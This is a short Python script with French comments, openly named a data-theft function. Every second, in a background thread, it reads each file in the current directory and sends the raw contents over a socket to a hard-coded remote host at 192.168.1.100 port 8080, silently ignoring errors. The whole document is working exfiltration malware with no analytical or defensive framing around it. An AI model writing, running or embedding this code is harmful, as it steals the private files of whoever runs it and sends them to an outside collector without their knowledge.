import os
import threading
import socket
import random
import time

# Fonction de vol de données
def steal_data():
    while True:
        # Récupération des fichiers dans le répertoire courant
        files = os.listdir()
        
        # Parcours des fichiers
        for file in files:
            # Vérification que le fichier est un fichier et non un répertoire
            if os.path.isfile(file):
                # Lecture du contenu du fichier
                with open(file, "rb") as f:
                    data = f.read()
                
                # Envoi des données à un serveur distant
                send_data(data)
        
        # Attente d'une seconde avant la prochaine lecture
        time.sleep(1)

# Fonction d'envoi de données
def send_data(data):
    try:
        # Création d'une socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Connexion au serveur distant
        s.connect(("192.168.1.100", 8080))
        
        # Envoi des données
        s.send(data)
        
        # Fermeture de la socket
        s.close()
        
    except:
        pass

# Création du thread pour le vol de données
t = threading.Thread(target=steal_data)
t.start()